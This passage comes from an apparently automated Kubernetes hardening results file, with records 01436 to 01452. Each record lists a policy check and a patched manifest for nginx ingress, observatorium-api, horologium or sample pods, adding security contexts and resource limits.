    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01436",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01437",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "errors": []
  },
  {
    "id": "01438",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "errors": []
  },
  {
    "id": "01439",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "errors": []
  },
  {
    "id": "01440",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "errors": []
  },
  {
    "id": "01441",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01442",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01443",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01444",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01445",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01446",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01447",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01448",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01449",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01450",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:stable\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01451",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:stable\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01452",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
